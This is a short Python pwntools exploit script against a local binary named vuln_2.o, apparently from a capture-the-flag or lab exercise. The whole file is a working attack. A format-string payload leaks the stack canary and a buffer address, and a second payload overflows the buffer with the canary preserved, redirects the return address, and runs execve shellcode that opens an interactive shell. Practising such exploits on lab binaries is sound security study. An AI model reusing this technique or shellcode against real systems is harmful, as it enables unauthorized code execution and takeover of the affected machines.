from pwn import *

p = process("./vuln_2.o")

first_payload = ",%29$x,%31$x"
p.sendline(first_payload)
gdb.attach(p)
answer = p.recvline().decode("utf-8").split(',')
canary = int(answer[2],16)
offset_address = int(answer[1],16)
buffor_address = offset_address - 0x108
stuffed_canary = b'a'*64+p32(canary)

shellcode_address = buffor_address + len(stuffed_canary) +4
shellcode = b'\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

second_payload = stuffed_canary + p32(shellcode_address) + shellcode

print(len(stuffed_canary))
p.sendline(second_payload)

p.interactive()
